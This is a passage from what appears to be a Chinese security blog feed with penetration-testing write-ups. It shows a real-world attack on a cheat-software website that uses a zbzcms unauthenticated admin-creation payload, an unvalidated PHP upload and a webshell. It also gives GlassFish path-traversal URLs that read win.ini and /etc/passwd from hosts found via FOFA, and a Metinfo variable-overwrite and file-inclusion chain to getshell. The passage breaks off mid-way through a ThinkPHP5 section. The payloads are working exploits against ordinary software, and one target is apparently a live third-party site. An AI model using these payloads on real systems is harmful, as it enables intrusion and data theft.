总结</h2><p>1、渗透流程：</p><p>信息收集—补丁筛选—利用MSF或者特定EXP—执行—拿到权限</p><p>（优先使用MSF，MSF没有找特定的EXP）</p><p>2、提权方法有部分适用在不同环境（本地提权比web提权成功几率大），当然也有通用方法（看是否在powershell还是cmd）</p><p>3、提权方法也有操作系统版本区别，特性决定方法利用面</p><p>4、提权方法有部分需要特定环境，如数据库，第三方提权等</p>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升-网站后台漏洞第三方获取</title>
      <link href="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/"/>
      <url>/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：</p><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87.png" alt="权限提升"></p><h2 id="0x01-权限分类"><a href="#0x01-权限分类" class="headerlink" title="0x01 权限分类"></a>0x01 权限分类</h2><blockquote><p>1、后台权限：（获得方式：爆破，注入猜解，弱口令等获取的帐号密码配合登录）</p><p>一般网站或应用后台只能操作应用的界面内容数据图片等信息，无法操作程序的源代码或服务器上的资源文件的。（如后台功能存在文件操作的话也可以操作文件数据）</p></blockquote><blockquote><p>2、网站权限：（获得方式：以上三种思路获取）</p><p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</p></blockquote><blockquote><p>3、数据库权限：操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。</p></blockquote><blockquote><p>4、接口权限：（邮件，短信，支付，第三方登录等）</p><p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取）。</p></blockquote><blockquote><p>5、还有其他的系统权限，域控权限等</p></blockquote><h2 id="0x02-某外挂网站的简单渗透提权（实战）"><a href="#0x02-某外挂网站的简单渗透提权（实战）" class="headerlink" title="0x02 某外挂网站的简单渗透提权（实战）"></a>0x02 某外挂网站的简单渗透提权（实战）</h2><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p>网站首页：<br><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619173017077.png" alt="image-20220619173017077"></p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>首先看下源代码搜集下相关信息：</p><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619173125971.png" alt="image-20220619173125971"></p><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619173338046.png" alt="image-20220619173338046"></p><p>没有特别的信息，只有图片地址，和相关页面的目录。</p><p>搜索一下图片地址：</p><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619173714602.png" alt="image-20220619173714602"></p><p>可以看到应该是zbzcms的模板。</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>找到站帮主源码进行下载，查看其结构：</p><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619173930890.png" alt="image-20220619173930890"></p><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619174050077.png" alt="image-20220619174050077"></p><p>在源码中找到后台登录地址：<br><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619174152402.png" alt="image-20220619174152402"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>尝试访问某外挂网站的后台地址：</p><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619174352395.png" alt="image-20220619174352395"></p><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619174325254.png" alt="image-20220619174325254"></p><p>可以看到后台登录界面；没有账号密码就拿不到后台权限，找一下zbzcms的相关漏洞。</p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>使用seay打开其源码进行审计，先自动审计一波，尤其是要找SQL注入漏洞可以获取管理员账号密码，或者直接未授权访问：</p><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619175308093.png" alt="image-20220619175308093"></p><p>看到<code>admin</code>文件夹下的文件存在<code>insert(&#39;admin&#39;,$POST);</code>字段，猜测admin字段是添加管理员的字段，打开源码审计：<br><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619175523695.png" alt="image-20220619175523695"></p><p>可以看到确实是添加管理员的代码段。</p><p>可以看到<code>mima</code>和<code>guanliyuan</code>可疑字段，接收密码和管理员参数。</p><p>若变量<code>$run==&#39;admin&#39;</code>则使用<code>POST</code>方法接收的<code>mima</code>和<code>guanliyuan</code>&#x3D;登录时接收的<code>mima</code>和<code>guanliyuan</code>，就进行管理员的添加。</p><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>构造payload：</p><pre class="line-numbers language-none"><code class="language-none">URL：&#x2F;cms&#x2F;cms&#x2F;admin&#x2F;run_ajax.php?run&#x3D;admin    POST数据：mima&#x3D;123456&amp;guanliyuan&#x3D;hhh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>利用插件执行payload：<br><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619180927410.png" alt="image-20220619180927410"></p><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619180944843.png" alt="image-20220619180944843"></p><p>执行payload后有返回值，返回了117。</p><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>尝试使用账号密码登录：</p><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619183236305.png" alt="image-20220619183236305"></p><p>这里登录不成功是由于权限不足。</p><p>分析代码可知，需要添加dengji&#x3D;1，设置为超级管理员：</p><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619190225512.png" alt="image-20220619190225512"></p><p>payload中加入dengji&#x3D;1：</p><pre class="line-numbers language-none"><code class="language-none">mima&#x3D;123456&amp;guanliyuan&#x3D;hhh&amp;dengji&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619183326562.png" alt="image-20220619183326562"></p><p>继续尝试登录，成功登录后台：</p><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619183136667.png" alt="image-20220619183136667"></p><p>这里已经拿到了后台权限，继续提权，拿到网站权限。</p><h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><p>来到根目录看到upload，应该是上传图片的目录：<br><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619183704120.png" alt="image-20220619183704120"></p><p>打开upload看到有上传功能：<br><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619183833143.png" alt="image-20220619183833143"></p><p>先尝试上传，看看有没有验证：</p><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619184021287.png" alt="image-20220619184021287"></p><p>成功上传1.php文件（一点没有验证）。</p><h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><p>使用蚁剑连接：<br><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619184213252.png" alt="image-20220619184213252"></p><p>可以看到有网站备份文件，可以直接打包下载。</p><h2 id="0x03-GlassFish-第三方中间件"><a href="#0x03-GlassFish-第三方中间件" class="headerlink" title="0x03 GlassFish 第三方中间件"></a>0x03 GlassFish 第三方中间件</h2><h3 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h3><p>FOFA搜索GlassFish的ip</p><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619193043811.png" alt="image-20220619193043811"></p><p>其服务是GlassFish。</p><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>网上搜GlassFish中间件的漏洞：</p><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619193454007.png" alt="image-20220619193454007"></p><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>访问地址：<br><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619194349609.png" alt="image-20220619194349609"></p><p>找到payload执行：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxxxx&#x2F;theme&#x2F;theme&#x2F;META-INF&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;windows&#x2F;win.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/19/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/image-20220619193932397.png" alt="image-20220619193932397"></p><p>返回win.ini相关数据。</p><p><strong>注意：这里payload执行是要区分windows和linux系统。（上面为windows系统payload）</strong></p><p><strong>Linux系统payload：</strong></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxxxx&#x2F;theme&#x2F;META-INF&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>后续可利用漏洞进行敏感文件的读取等等。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>漏洞产生的原因多层面：操作系统，中间件，网站，后台，数据库，第三方插件等等</p><blockquote><p>1、内网渗透中主机权限的获取：1.网站，2.数据库，3.HTTP</p><p>2、具体的权限：1.后台权限2.网站权限3.数据库权限4.接口权限5.系统权限，6.域控权限</p><p>3、后台权限：一般网站或者应用后台只能操作应用界面内容数据图片信息，无法操作程序的源代码，或者服务器的资源文件。（如果后台存在文件操作，也可以操作文件）（获取方式：爆破，注入猜解，弱口令）</p><p>4、网站权限：查看或者修改程序源代码，可以进行网站的配置文件读取（接口配置信息，数据库配置信息等等），还能收集服务器操作系统的信息，为后续系统提权铺垫（文件上传）</p><p>5、数据库权限：操作数据库增删改查等等（获取方式：源码或者配置文件泄露，也可以是网站权限（webshell）进行数据库配置文件读取）</p><p>6、接口权限：邮件，短信，支付，第三方支付（更改接口，可以更改支付，或者调用短信轰炸）</p><p>7、相关操作被拒绝无法实现的时候，就会涉及到权限提升</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计-TP5框架1</title>
      <link href="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/"/>
      <url>/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：</p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/TP%E6%A1%86%E6%9E%B6.png" alt="TP框架"></p><h2 id="0x01-Metinfo-无框架-变量覆盖-自动审计或搜索"><a href="#0x01-Metinfo-无框架-变量覆盖-自动审计或搜索" class="headerlink" title="0x01 Metinfo-无框架-变量覆盖-自动审计或搜索"></a>0x01 Metinfo-无框架-变量覆盖-自动审计或搜索</h2><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p>打开靶场：</p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618102033894.png" alt="image-20220618102033894"></p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>使用seay先进行自动审计：<br><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618102222723.png" alt="image-20220618102222723"></p><p>检测到可能存在变量覆盖漏洞：<br><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618102354770.png" alt="image-20220618102354770"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>打开其配置文件审计相关函数：</p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618102731712.png" alt="image-20220618102731712"></p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618102532401.png" alt="image-20220618102532401"></p><p>可以看到双$$符号。</p><p>foreach()函数，每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元），这里相当于两个循环的for循环，第一个request分别循环三种传参方法；第二个循环，当前单元的键名也会在每次循环中被赋给变量 $key，之后$key又赋值给value，然后再将value的值过滤后赋值给$key，总之，就是通过get，post，cookie接受数据，进行变量覆盖 。</p><p>涉及函数：</p><p>foreach()函数：遍历给定的数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。</p><p> <code>php</code>中的<code>=&gt;</code>：一般用作数组键名与元素的连接符。简单来说就是使用&#x3D;&gt;符号来分隔键和值，左侧表示键，右侧表示值。</p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618104255974.png" alt="image-20220618104255974"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>由于配置文件几乎全局包含，搜索相关包含其文件的文件：<br><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618104908470.png" alt="image-20220618104908470"></p><p>index.php包含其文件。</p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618104947665.png" alt="image-20220618104947665"></p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>由于common.inc.php文件可能存在变量覆盖漏洞，将index.php文件添加测试语句进行测试；由于现在打开的index.php文件不是网站首页文件：<br><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618105149180.png" alt="image-20220618105149180"></p><p>网站首页文件内在templates目录下：</p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618105310603.png" alt="image-20220618105310603"></p><p>在index.php文件中写入测试语句：<br><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618111728315.png" alt="image-20220618111728315"></p><p>接着在index.html文件中输出：<br><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618105745708.png" alt="image-20220618105745708"></p><p>网站首页看到test的数据：</p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618111712482.png" alt="image-20220618111712482"></p><p><strong>注意：在index.php文件中，test变量的赋值一定要在index.php文件中的包含文件common.inc.php的上方，不然test变量的值不会改变。</strong></p><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>传参：test接收值123456，返回值123465，而不是asdas，实现了变量覆盖。<br><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618112341335.png" alt="image-20220618112341335"></p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618112420227.png" alt="image-20220618112420227"></p><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>审计：<br>三种方式传参的值都可以接受，比如这里GET接收test</p><p>foreach($_GET as $_key&#x3D;&gt;$_value)</p><p>get传参test&#x3D;111,相当于数组{“test”:”111”}</p><p>那么$_key&#x3D;test;$_value&#x3D;111,而$_value的过滤类似魔术引号加&#x2F;&#x2F;只对注入防范有用，这里对111不起作用</p><p>这里就会将$test&#x3D;$_value&#x3D;111 </p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618113103692.png" alt="image-20220618113103692"></p><h3 id="0x07-配合文件包含漏洞进行攻击"><a href="#0x07-配合文件包含漏洞进行攻击" class="headerlink" title="0x07 配合文件包含漏洞进行攻击"></a>0x07 配合文件包含漏洞进行攻击</h3><p>条件：</p><p>1、include($filename)</p><p>2、包含文件common.inc.php </p><p>先搜索文件包含漏洞关键函数：<br>include，include_once，require require_once 等：</p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618114032789.png" alt="image-20220618114032789"></p><p>发现有一个$moudle变量，打开文件查看：</p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618114140892.png" alt="image-20220618114140892"></p><p>没有包含common.inc.php变量覆盖文件，无法利用。</p><p>打开moudle.php文件，包含了common.inc.php变量覆盖文件：<br><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618114531482.png" alt="image-20220618114531482"></p><p>表示这个index.php文件间接包含了common.inc.php变量覆盖文件：<br><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618114729593.png" alt="image-20220618114729593"></p><p>require_once()函数：</p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618114922885.png" alt="image-20220618114922885"></p><h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><p>审计：</p><p>查看原来module的赋值条件，通过判断fmofule的值，当fmofule&#x3D;7并且变量list为空时，module就等于<code>$modulefname[$mdle][$mdtp]</code>，这里我们只需要确定module有赋值，然后我们去覆盖就行，不用确定module的值。</p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618115434624.png" alt="image-20220618115434624"></p><h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><p>访问存在文件包含漏洞的目录about&#x2F;index.php：</p><p>构造payload：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;metinfo&#x2F;about&#x2F;index.php?fmodule&#x3D;7&amp;module&#x3D;1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618120347202.png" alt="image-20220618120347202"></p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618120354397.png" alt="image-20220618120354397"></p><p>成功打开1.txt文件，执行phpinfo()函数。</p><p>后续只需上传任意文件，只需更改<code>module</code>值，访问上传的文件地址进行getshell。</p><h2 id="0x02-Thinkphp5框架"><a href="#0x02-Thinkphp5框架" class="headerlink" title="0x02 Thinkphp5框架"></a>0x02 Thinkphp5框架</h2><h3 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h3><p>打开网站：</p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618122740026.png" alt="image-20220618122740026"></p><p>其中的APPlication是应用的目录：</p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618122901748.png" alt="image-20220618122901748"></p><p>具体参考文章：</p><p><a href="https://www.kancloud.cn/thinkphp/thinkphp5-guide/90110">https://www.kancloud.cn/thinkphp/thinkphp5-guide/90110</a></p><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>这段代码的作用就是定义应用目录APP_PATH和加载ThinkPHP框架的入口文件：</p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618123651593.png" alt="image-20220618123651593"></p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618124301371.png" alt="image-20220618124301371"></p><p>首页加载的文件实在APPlication目录下的：<img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618124039063.png" alt="image-20220618124039063"></p><p>具体解释：<br><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618124342433.png" alt="image-20220618124342433"></p><h3 id="0x02-测试"><a href="#0x02-测试" class="headerlink" title="0x02 测试"></a>0x02 测试</h3><p>class中写入test方法，浏览器按照格式访问，如图：</p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618130840780.png" alt="image-20220618130840780"></p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618130828858.png" alt="image-20220618130828858"></p><h3 id="0x03-Thinkphp版本查看"><a href="#0x03-Thinkphp版本查看" class="headerlink" title="0x03 Thinkphp版本查看"></a>0x03 Thinkphp版本查看</h3><p>1、通过url的报错查看：<br><img 